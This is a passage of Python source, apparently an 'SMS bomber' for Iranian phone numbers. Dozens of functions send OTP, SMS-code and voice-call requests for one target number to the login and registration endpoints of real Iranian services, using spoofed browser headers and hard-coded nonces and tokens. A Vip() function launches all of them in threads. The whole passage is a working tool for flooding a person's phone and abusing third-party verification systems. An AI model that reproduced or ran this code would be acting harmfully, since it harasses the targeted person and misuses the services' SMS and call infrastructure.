            print_bomb('hierwh')
            n4 = {"mobile":"0"+phone}
            rhead = {'user-agent':
            generate_user_agent()}
            post(url="https://api.paymishe.com/api/v1/otp/registerOrLogin",json=n4, headers=rhead)
        def podro(phone):
            print_bomb('hierwh')
            n4 = {"mobile":"0"+phone}
            rhead = {'user-agent':
            generate_user_agent()}
            post(url="https://api.paymishe.com/api/v1/otp/registerOrLogin",json=n4, headers=rhead)
        def rayshomar(phone):
            print_bomb('hierwh')
            n4 = f"MobileNumber=0{phone}"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','app-version': '2.0.6','content-length': '24','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','language': 'fa','origin': 'https://app.rayshomar.ir','os-type': 'webapp','referer': 'https://app.rayshomar.ir/','sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent':
            generate_user_agent(os="win")}
            post(url="https://api.rayshomar.ir/api/Register/RegistrMobile",data=n4, headers=rhead)

        def amoomilad(phone):
            print_bomb('hierwh')
            n4 = {"Token":"5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c","DeviceId":1,"PhoneNumber":"0"+phone,"Helper":77942}
            rhead = {'user-agent':
            generate_user_agent()}
            post(url="https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",json=n4, headers=rhead)

        def ashrafi(phone):
            print_bomb('hierwh')
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone}&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={phone}&dig_otp=&dig_nounce=54dfdabe34"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '203','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://ashraafi.com','referer': 'https://ashraafi.com/login-register/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://ashraafi.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)

        def bandarazad(phone):
            print_bomb('hierwh')
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone}&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone}&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '276','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://bandarazad.com','referer': 'https://bandarazad.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbandarazad.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://bandarazad.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)    
        def bazidone(phone):
            print_bomb('hierwh')
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone}&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone}&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '229','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://bazidone.com','referer': 'https://bazidone.com/?login=true&page=1&redirect_to=https%3A%2F%2Fbazidone.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://bazidone.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
        def bigtoys(phone):
            print_bomb('hierwh')
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone}&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A8%DB%8C%D8%A8%D9%84%DB%8C%D9%84&digregcode=%2B98&digits_reg_mail=0{phone}&digregscode2=%2B98&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '351','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://www.bigtoys.ir','referer': 'https://www.bigtoys.ir/?login=true&back=home&page=1','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://www.bigtoys.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
        def bitex24(phone):
            print_bomb('hierwh')
            HEADER = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','lang': 'null','origin': 'https://admin.bitex24.com','referer': 'https://admin.bitex24.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent':
            generate_user_agent(os="win")}
            get(url=f"https://bitex24.com/api/v1/auth/sendSms?mobile=0{phone}&dial_code=0", headers=HEADER)
                
        def candoosms(phone):
            print_bomb('hierwh')
            n4 = f"action=send_sms&phone=0{phone}"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '33','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.candoosms.com','referer': 'https://www.candoosms.com/signup/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://www.candoosms.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
        def farsgraphic(phone):
            print_bomb('hierwh')
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo={phone}&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%86%DB%8C%D9%85%D9%86%D9%85%D9%85%D9%86%DB%8C%D8%B3&digits_reg_lastname=%D9%85%D9%86%D8%B3%DB%8C%D8%B2%D8%AA%D9%86&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail={phone}&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '413','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://farsgraphic.com','referer': 'https://farsgraphic.com/?login=true&page=1&redirect_to=https%3A%2F%2Ffarsgraphic.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://farsgraphic.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
        def glite(phone):
            print_bomb('hierwh')
            n4 = f"action=logini_first&login=0{phone}"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.glite.ir','referer': 'https://www.glite.ir/user-login/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://www.glite.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
        def hemat(phone):
            print_bomb('hierwh')
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone}&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=0{phone}&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '307','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://shop.hemat-elec.ir','referer': 'https://shop.hemat-elec.ir/?login=true&page=1&redirect_to=https%3A%2F%2Fshop.hemat-elec.ir%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://shop.hemat-elec.ir/wp-admin/admin-ajax.php",data=n4, headers=rhead)
        def kodakamoz(phone):
            print_bomb('hierwh')
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone}&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%D9%84%D8%A8%D8%A8%DB%8C%DB%8C%D8%A8%D8%AB%D9%82%D8%AD&digits_reg_displayname=%D8%A8%D8%A8%D8%A8%DB%8C%D8%B1%D8%A8%D9%84%D9%84%DB%8C%D8%A8%D9%84&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=0{phone}&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '554','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://www.kodakamoz.com','referer': 'https://www.kodakamoz.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.kodakamoz.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://www.kodakamoz.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
        def mipersia(phone):
            print_bomb('hierwh')
            n4 = f"action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone}&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=0{phone}&digregscode2=%2B98&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '277','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=98','origin': 'https://www.mipersia.com','referer': 'https://www.mipersia.com/?login=true&page=1&redirect_to=https%3A%2F%2Fwww.mipersia.com%2F','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://www.mipersia.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)
        def novibook(phone):
            print_bomb('hierwh')
            n4 = f"phone=0{phone}"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://novinbook.com/index.php?route=account/phone",data=n4, headers=rhead)
        def offch(phone):
            print_bomb('hierwh')
            n4 = {"username":"0"+phone}
            rhead = {'user-agent':
            generate_user_agent()}
            post(url="https://api.offch.com/auth/otp",json=n4, headers=rhead)

        def sabziman(phone):
            print_bomb('hierwh')
            n4 = f"action=newphoneexist&phonenumber=0{phone}"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '44','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://sabziman.com','referer': 'https://sabziman.com/%D8%B3%D9%88%D8%A7%D9%84%D8%A7%D8%AA-%D9%85%D8%AA%D8%AF%D8%A7%D9%88%D9%84/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://sabziman.com/wp-admin/admin-ajax.php",data=n4, headers=rhead)

        def tajtehran(phone):
            print_bomb('hierwh')
            n4 = f"mobile=0{phone}&password=mamad1234"
            rhead = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '37','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://tajtehran.com','referer': 'https://tajtehran.com/','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'}
            post(url="https://tajtehran.com/RegisterRequest",data=n4, headers=rhead)

        def mrbilitcall(phone):
            print_bomb('hierwh')
            get(url=f'https://auth.mrbilit.com/api/Token/send/byCall?mobile=0{phone}',
            )    

        def tezolmarket(phone):
            print_bomb('hierwh')
            persian = get(f"https://api.codebazan.ir/adad/?text={phone}").json()
            get('https://www.tezolmarket.com/Account/Login',f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')

        def gap(phone):
            print_bomb('hierwh')
            get(url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{phone}&type=IVR')

        def novinbook(phone):
            print_bomb('hierwh')
            post(url="https://novinbook.com/index.php?route=account/phone",data=f"phone=0{phone}&call=yes",headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'x-requested-with': 'XMLHttpRequest'})

        def azki(phone):
            print_bomb('hierwh')
            get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{phone}", headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent':
            generate_user_agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'})

        def trip(phone):
            print_bomb('hierwh')
            rhead = {"content-type": "application/json;charset=UTF-8","sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"","accept": "application/json, text/plain, */*","accept-language": "fa-IR","user-agent":
            generate_user_agent(os="android"),"sec-ch-ua-platform": "\"Android\"","origin": "https://www.trip.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.trip.ir/","accept-encoding": "gzip, deflate, br","host": "gateway.trip.ir"}
            #Call&sms
            post(url="https://gateway.trip.ir/api/registers", headers=rhead, json={"CellPhone":"0"+phone})
            post(url="https://gateway.trip.ir/api/Totp", headers=rhead, json={"PhoneNumber": "0"+phone})

        def paklean(phone):
            print_bomb('hierwh')
            n4 = {"username": "0"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://client.api.paklean.com/user/resendVoiceCode", json=n4, headers=rhead)

        def ragham(phone):
            print_bomb('hierwh')
            n4 = {"phone": "+98"+phone}
            rhead = {"user-agent":
            generate_user_agent()}
            post(url="https://web.raghamapp.com/api/users/code",json=n4, headers=rhead)

        # ================================[SEND SMS FUNC]================================
        def is_phone(phone: str):
            if match(r"(\+989|^989|09|9)[0-9]{9}", phone):
                return sub(r"(\+989|^989|09)", "+989", phone)
            return False
        def Vip(phone, Time):
            Thread(target=snap, args=[phone]).start(), sleep(Time)
            Thread(target=tap30, args=[phone]).start(), sleep(Time)
            Thread(target=divar, args=[phone]).start(), sleep(Time)
            Thread(target=snapfood, args=[phone]).start(), sleep(Time)
            Thread(target=sheypoor, args=[phone]).start(), sleep(Time)
            Thread(target=smarket, args=[phone]).start(), sleep(Time)
            Thread(target=sTrip, args=[phone]).start(), sleep(Time)
            Thread(target=filmnet, args=[phone]).start(), sleep(Time)
            Thread(target=itool, args=[phone]).start(), sleep(Time)    
            Thread(target=anar, args=[phone]).start(), sleep(Time)
            Thread(target=bn, args=[phone]).start(), sleep(Time)
            Thread(target=basalam, args=[phone]).start(), sleep(Time)
            Thread(target=okorosh, args=[phone]).start(), sleep(Time)
            Thread(target=gapfilm, args=[phone]).start(), sleep(Time)
            Thread(target=bimitoVip, args=[phone]).start(), sleep(Time)    
            Thread(target=seebirani, args=[phone]).start(), sleep(Time)
            Thread(target=binjo, args=[phone]).start(), sleep(Time)
            Thread(target=chmdon, args=[phone]).start(), sleep(Time) 
            Thread(target=simkhanT, args=[phone]).start(), sleep(Time)
            Thread(target=simkhanF, args=[phone]).start(), sleep(Time)
            Thread(target=mihanpezeshk, args=[phone]).start(), sleep(Time)
            Thread(target=mek, args=[phone]).start(), sleep(Time)
            phone = str(phone).replace("+98",'')
            Thread(target=a4baz, args=[phone]).start(), sleep(Time)
            Thread(target=abantether, args=[phone]).start(), sleep(Time)
            Thread(target=alibaba, args=[phone]).start(), sleep(Time)
            Thread(target=alinance, args=[phone]).start(), sleep(Time)
            Thread(target=alopeyk, args=[phone]).start(), sleep(Time)
            Thread(target=alopeyksafir, args=[phone]).start(), sleep(Time)
            Thread(target=amoomilad, args=[phone]).start(), sleep(Time)
            Thread(target=anargift, args=[phone]).start(), sleep(Time)
            Thread(target=arshian, args=[phone]).start(), sleep(Time)
            Thread(target=ashrafi, args=[phone]).start(), sleep(Time)
            Thread(target=ayantech, args=[phone]).start(), sleep(Time)
            Thread(target=azinja, args=[phone]).start(), sleep(Time)
            Thread(target=azki, args=[phone]).start(), sleep(Time)
            Thread(target=bahramshop, args=[phone]).start(), sleep(Time)
            Thread(target=bama, args=[phone]).start(), sleep(Time)
            Thread(target=banankala, args=[phone]).start(), sleep(Time)
            Thread(target=bandarazad, args=[phone]).start(), sleep(Time)
            Thread(target=banimod, args=[phone]).start(), sleep(Time)
            Thread(target=baskol, args=[phone]).start(), sleep(Time)
            Thread(target=bazidone, args=[phone]).start(), sleep(Time)
            Thread(target=beheshticarpet, args=[phone]).start(), sleep(Time)
            Thread(target=behtarino, args=[phone]).start(), sleep(Time)
            Thread(target=behzadshami, args=[phone]).start(), sleep(Time)
            Thread(target=beroozmarket, args=[phone]).start(), sleep(Time)
            Thread(target=bigtoys, args=[phone]).start(), sleep(Time)
            Thread(target=bimebazar, args=[phone]).start(), sleep(Time)
            Thread(target=bimito, args=[phone]).start(), sleep(Time)
            Thread(target=bit24, args=[phone]).start(), sleep(Time)
            Thread(target=bitbarg, args=[phone]).start(), sleep(Time)
            Thread(target=bitex24, args=[phone]).start(), sleep(Time)
            Thread(target=bitpin, args=[phone]).start(), sleep(Time)
            Thread(target=candoosms, args=[phone]).start(), sleep(Time)
            Thread(target=chamedon, args=[phone]).start(), sleep(Time)
            Thread(target=chartex, args=[phone]).start(), sleep(Time)
            Thread(target=chaymarket, args=[phone]).start(), sleep(Time)
            Thread(target=cinematicket, args=[phone]).start(), sleep(Time)
            Thread(target=classino, args=[phone]).start(), sleep(Time)
            Thread(target=coffefastfoodluxury, args=[phone]).start(), sleep(Time)
            Thread(target=daal, args=[phone]).start(), sleep(Time)
            Thread(target=dadpardaz, args=[phone]).start(), sleep(Time)
            Thread(target=dastakht, args=[phone]).start(), sleep(Time)
            Thread(target=delino, args=[phone]).start(), sleep(Time)
            Thread(target=deniizshop, args=[phone]).start(), sleep(Time)
            Thread(target=devsloop, args=[phone]).start(), sleep(Time)
            Thread(target=dicardo, args=[phone]).start(), sleep(Time)
            Thread(target=didnegar, args=[phone]).start(), sleep(Time)
            Thread(target=digify, args=[phone]).start(), sleep(Time)
            Thread(target=digikala, args=[phone]).start(), sleep(Time)
            Thread(target=digistyle, args=[phone]).start(), sleep(Time)
            Thread(target=doctoreto, args=[phone]).start(), sleep(Time)
            Thread(target=dosma, args=[phone]).start(), sleep(Time)
            Thread(target=drdr, args=[phone]).start(), sleep(Time)
            Thread(target=drnext, args=[phone]).start(), sleep(Time)
            Thread(target=drsaina, args=[phone]).start(), sleep(Time)
            Thread(target=drto, args=[phone]).start(), sleep(Time)
            Thread(target=ehteraman, args=[phone]).start(), sleep(Time)
            Thread(target=emtiaz, args=[phone]).start(), sleep(Time)
            Thread(target=exo, args=[phone]).start(), sleep(Time)
            Thread(target=farsgraphic, args=[phone]).start(), sleep(Time)
            Thread(target=farvi, args=[phone]).start(), sleep(Time)
            Thread(target=fidibo, args=[phone]).start(), sleep(Time)
            Thread(target=flightio, args=[phone]).start(), sleep(Time)
            Thread(target=football360, args=[phone]).start(), sleep(Time)
            Thread(target=gap, args=[phone]).start(), sleep(Time)
            Thread(target=ghabzino, args=[phone]).start(), sleep(Time)
            Thread(target=ghasedak24, args=[phone]).start(), sleep(Time)
            Thread(target=glite, args=[phone]).start(), sleep(Time)
            Thread(target=hamlex, args=[phone]).start(), sleep(Time)
            Thread(target=hamrahbours, args=[phone]).start(), sleep(Time)
            Thread(target=hamrahmechanich, args=[phone]).start(), sleep(Time)
            Thread(target=hemat, args=[phone]).start(), sleep(Time)
            Thread(target=hiword, args=[phone]).start(), sleep(Time)
            Thread(target=homtick, args=[phone]).start(), sleep(Time)
            Thread(target=hyperjan, args=[phone]).start(), sleep(Time)
            Thread(target=iranamlaak, args=[phone]).start(), sleep(Time)
            Thread(target=iranicard, args=[phone]).start(), sleep(Time)
            Thread(target=iranketab, args=[phone]).start(), sleep(Time)
            Thread(target=iranlms, args=[phone]).start(), sleep(Time)
            Thread(target=irwco, args=[phone]).start(), sleep(Time)
            Thread(target=itoll, args=[phone]).start(), sleep(Time)
            Thread(target=kafegheymat, args=[phone]).start(), sleep(Time)
            Thread(target=karchidari, args=[phone]).start(), sleep(Time)
            Thread(target=ketabchi, args=[phone]).start(), sleep(Time)
            Thread(target=khanomi, args=[phone]).start(), sleep(Time)
            Thread(target=khodro45, args=[phone]).start(), sleep(Time)
            Thread(target=kilid, args=[phone]).start(), sleep(Time)
            Thread(target=kodakamoz, args=[phone]).start(), sleep(Time)
            Thread(target=kukala, args=[phone]).start(), sleep(Time)
            Thread(target=lendo, args=[phone]).start(), sleep(Time)
            Thread(target=limome, args=[phone]).start(), sleep(Time)
            Thread(target=mashinbank, args=[phone]).start(), sleep(Time)
            Thread(target=mazoo, args=[phone]).start(), sleep(Time)
            Thread(target=mcishop, args=[phone]).start(), sleep(Time)
            Thread(target=melix, args=[phone]).start(), sleep(Time)
            Thread(target=miareh, args=[phone]).start(), sleep(Time)
            Thread(target=mipersia, args=[phone]).start(), sleep(Time)
            Thread(target=moshaveran724, args=[phone]).start(), sleep(Time)
            Thread(target=mrbilit, args=[phone]).start(), sleep(Time)
            Thread(target=mrbilitcall, args=[phone]).start(), sleep(Time)
            Thread(target=namava, args=[phone]).start(), sleep(Time)
            Thread(target=nobat, args=[phone]).start(), sleep(Time)
            Thread(target=novibook, args=[phone]).start(), sleep(Time)
            Thread(target=novinbook, args=[phone]).start(), sleep(Time)
            Thread(target=offch, args=[phone]).start(), sleep(Time)
            Thread(target=offdecor, args=[phone]).start(), sleep(Time)
            Thread(target=okala, args=[phone]).start(), sleep(Time)
            Thread(target=okcs, args=[phone]).start(), sleep(Time)
            Thread(target=olgoo, args=[phone]).start(), sleep(Time)
            Thread(target=opco, args=[phone]).start(), sleep(Time)
            Thread(target=ostadkar, args=[phone]).start(), sleep(Time)
            Thread(target=otaghak, args=[phone]).start(), sleep(Time)
            Thread(target=pakhsh, args=[phone]).start(), sleep(Time)
            Thread(target=paklean, args=[phone]).start(), sleep(Time)
            Thread(target=pateh, args=[phone]).start(), sleep(Time)
            Thread(target=paymishe, args=[phone]).start(), sleep(Time)
            Thread(target=pezeshket, args=[phone]).start(), sleep(Time)
            Thread(target=pindo, args=[phone]).start(), sleep(Time)
            Thread(target=pinket, args=[phone]).start(), sleep(Time)
            Thread(target=pinorest, args=[phone]).start(), sleep(Time)
            Thread(target=pirankalaco, args=[phone]).start(), sleep(Time)
            Thread(target=podro, args=[phone]).start(), sleep(Time)
            Thread(target=pooleno, args=[phone]).start(), sleep(Time)
            Thread(target=pubgsell, args=[phone]).start(), sleep(Time)
            Thread(target=publisha, args=[phone]).start(), sleep(Time)
            Thread(target=ragham, args=[phone]).start(), sleep(Time)
            Thread(target=raybit, args=[phone]).start(), sleep(Time)
            Thread(target=rayshomar, args=[phone]).start(), sleep(Time)
            Thread(target=reyanertebet, args=[phone]).start(), sleep(Time)
            Thread(target=rojashop, args=[phone]).start(), sleep(Time)
            Thread(target=rokla, args=[phone]).start(), sleep(Time)
            Thread(target=rubika, args=[phone]).start(), sleep(Time)
            Thread(target=sabziman, args=[phone]).start(), sleep(Time)
            Thread(target=safarmarket, args=[phone]).start(), sleep(Time)
            Thread(target=safiran, args=[phone]).start(), sleep(Time)
            Thread(target=see5, args=[phone]).start(), sleep(Time)
            Thread(target=shab, args=[phone]).start(), sleep(Time)
            Thread(target=shad, args=[phone]).start(), sleep(Time)
            Thread(target=shahrefarsh, args=[phone]).start(), sleep(Time)
            Thread(target=sibbank, args=[phone]).start(), sleep(Time)
            Thread(target=sibirani, args=[phone]).start(), sleep(Time)
            Thread(target=simkhan, args=[phone]).start(), sleep(Time)
            Thread(target=snapmarket, args=[phone]).start(), sleep(Time)
            Thread(target=snapp, args=[phone]).start(), sleep(Time)
            Thread(target=snappdoctor, args=[phone]).start(), sleep(Time)
            Thread(target=snappexpress, args=[phone]).start(), sleep(Time)
            Thread(target=snappfood, args=[phone]).start(), sleep(Time)
            Thread(target=snappmarket, args=[phone]).start(), sleep(Time)
            Thread(target=snapptrip, args=[phone]).start(), sleep(Time)
            Thread(target=steelalborz, args=[phone]).start(), sleep(Time)
